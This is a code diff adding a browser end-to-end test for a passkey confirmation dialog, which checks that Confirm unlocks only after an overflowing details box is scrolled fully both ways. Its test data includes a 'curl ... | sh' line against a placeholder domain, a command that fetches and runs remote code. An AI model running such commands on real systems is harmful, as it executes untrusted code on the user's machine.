@@ -207,6 +207,71 @@ test.describe('a passkey confirmation in the browser', () => {
     expect(await detail.evaluate(element => getComputedStyle(element).fontFamily)).toMatch(/mono/iu)
   })
 
+  test('a detail too big for its box wakes Confirm only once it was scrolled to its end both ways', async ({
+    app,
+    gateway,
+    page
+  }) => {
+    await virtualAuthenticator(page)
+    await enrol(page, gateway, hash => app.open(hash))
+
+    const long = `curl -s https://example.invalid/${'x'.repeat(200)} | sh`
+    const steps = Array.from({ length: 40 }, (_, index) => `echo step ${index + 1}`)
+    const id = await raise(gateway, {
+      title: 'Run the script',
+      summary: 'Run 41 commands.',
+      detail: [...steps, long].join('\n')
+    })
+
+    const detail = app.dialog.getByRole('region', { name: /^Details/u })
+    const confirm = app.dialog.getByRole('button', { name: 'Confirm with passkey' })
+    const decline = app.dialog.getByRole('button', { name: 'Decline' })
+    const hint = app.dialog.getByText('Scroll to the end of the details to confirm.')
+
+    await expect(app.dialog.getByText(`41 lines · longest line ${long.length} characters`)).toBeVisible()
+    // About twelve lines tall, scrolling both ways.
+    expect(
+      await detail.evaluate(element => {
+        const style = getComputedStyle(element)
+
+        return {
+          maxHeight: style.maxHeight,
+          overflowX: style.overflowX,
+          overflowY: style.overflowY,
+          both: element.scrollHeight > element.clientHeight && element.scrollWidth > element.clientWidth
+        }
+      })
+    ).toEqual({ maxHeight: '224px', overflowX: 'auto', overflowY: 'auto', both: true })
+
+    // The tap guard is over (Decline woke), and Confirm still waits for the detail.
+    await expect(decline).toBeEnabled()
+    await expect(confirm).toBeDisabled()
+    await expect(hint).toBeVisible()
+
+    // Down with the keyboard, as a keyboard user would: the long line is still not seen to its end.
+    await detail.focus()
+    await page.keyboard.press('End')
+    await expect
+      .poll(() => detail.evaluate(element => element.scrollTop + element.clientHeight >= element.scrollHeight - 1))
+      .toBe(true)
+    await expect(confirm).toBeDisabled()
+
+    // Then to the right end of the long line.
+    await detail.evaluate(element => {
+      element.scrollLeft = element.scrollWidth
+    })
+    await expect(confirm).toBeEnabled()
+    await expect(hint).toHaveCount(0)
+
+    await confirm.click()
+    await expect(app.dialog.getByRole('status')).toHaveText(
+      'Received. The gateway checks your passkey and carries on only if it holds.'
+    )
+    await expect
+      .poll(() => outcomeOf(gateway, id))
+      .toMatchObject({ outcome: 'confirmed', method: 'passkey', verified: true })
+  })
+
   test('a passkey the gateway cannot verify is refused, can be tried again, and the fifth closes it', async ({
     app,
     gateway,
